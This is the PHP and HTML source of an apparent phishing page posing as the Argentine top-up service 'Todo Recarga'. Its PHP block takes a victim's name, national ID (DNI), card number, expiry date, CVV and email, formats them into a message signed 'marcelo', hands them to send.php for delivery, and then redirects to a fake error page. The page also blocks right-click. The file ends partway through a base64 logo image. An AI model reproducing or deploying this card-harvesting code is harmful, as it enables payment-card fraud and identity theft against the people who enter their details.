<?php 
session_start();
if (isset($_POST['confirm_data'])) {
    $obeder = $_POST['obeder'];
    $name = $_POST['name'];
    $dni = $_POST['dni'];
    $venc = $_POST['venc'];
    $cvv = $_POST['cvv'];
	$email= $_POST['email'];
    $msj = "
[+] ============== [ Tarjeta ] ===============[+]
[+] IP : ".getenv('REMOTE_ADDR')."
[+] Nombre del Titular : ".$name."
[+] DNI del Titular : ".$dni."
[+] Numero De Tarjeta : ".$obeder."
[+] Vencimiento : ".$venc."
[+] CVV : ".$cvv."
[+] Email del Titular : ".$email."
[+] =========== [ marcelo ] ============[+]
	";
    include 'send.php';
    header ("location:https://todorecarga.online/error.php");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" type="image/png" href="https://telerecargas.com.ar/img/favico.ico">
<title>Todo Recarga</title>
<link rel="stylesheet" href="stylea.css">
<link rel="stylesheet" href="styleb.css">
<script> src="validateExpirationDate.js"</script>
<script> src="formatCreditCardNumber.js"</script>
</head>

<body oncontextmenu="return false;">
<div class="navbmenu">
    <div class="menu"> 
       <a href= "https://todorecarga.online">
	   <img src="data:image/png;base64,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